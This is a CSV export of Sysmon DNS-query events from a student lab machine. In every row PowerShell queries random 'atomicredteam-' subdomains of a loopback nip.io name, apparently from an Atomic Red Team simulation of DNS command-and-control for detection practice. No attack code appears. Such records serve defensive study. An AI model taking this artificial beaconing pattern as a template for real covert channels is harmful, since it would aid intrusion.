"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174003,"Query: atomicredteam-287645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.973","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174004,"Query: atomicredteam-840879.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.012","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174005,"Query: atomicredteam-160979.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.051","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174006,"Query: atomicredteam-188704.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.092","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174007,"Query: atomicredteam-481431.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.303","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174008,"Query: atomicredteam-61142.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.350","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174009,"Query: atomicredteam-745058.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174010,"Query: atomicredteam-865835.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174011,"Query: atomicredteam-61694.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.618","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174012,"Query: atomicredteam-616093.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.669","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174013,"Query: atomicredteam-608890.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.707","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174014,"Query: atomicredteam-322860.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.746","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.051 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174015,"Query: atomicredteam-974359.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.784","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.052 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174016,"Query: atomicredteam-186932.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.052 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174017,"Query: atomicredteam-830635.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.865","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.052 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174018,"Query: atomicredteam-927837.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.905","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.052 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174019,"Query: atomicredteam-992253.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.942","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:34.052 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174020,"Query: atomicredteam-970316.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:33.986","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174021,"Query: atomicredteam-271736.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174022,"Query: atomicredteam-414442.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.066","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174023,"Query: atomicredteam-917810.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.104","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174024,"Query: atomicredteam-500564.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.424","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174025,"Query: atomicredteam-527692.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.464","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174026,"Query: atomicredteam-690150.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.502","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174027,"Query: atomicredteam-731545.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174028,"Query: atomicredteam-766444.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.578","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174029,"Query: atomicredteam-783467.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174030,"Query: atomicredteam-720286.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.925","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174031,"Query: atomicredteam-246489.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:34.963","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174032,"Query: atomicredteam-612064.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.001","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:35.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174033,"Query: atomicredteam-425434.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.041","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174034,"Query: atomicredteam-639119.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.085","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174035,"Query: atomicredteam-614572.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174036,"Query: atomicredteam-182634.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.622","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174037,"Query: atomicredteam-242331.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.826","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174038,"Query: atomicredteam-846921.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.869","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174039,"Query: atomicredteam-972489.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:35.911","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:36.070 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174040,"Query: atomicredteam-833157.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.043","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174041,"Query: atomicredteam-410770.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.092","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174042,"Query: atomicredteam-25483.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.139","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174043,"Query: atomicredteam-181584.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.202","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174044,"Query: atomicredteam-237676.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.072 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174045,"Query: atomicredteam-499725.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.279","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174046,"Query: atomicredteam-252077.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.354","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174047,"Query: atomicredteam-329147.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174048,"Query: atomicredteam-776738.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174049,"Query: atomicredteam-45330.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.579","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:37.078 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174050,"Query: atomicredteam-382740.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:36.900","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
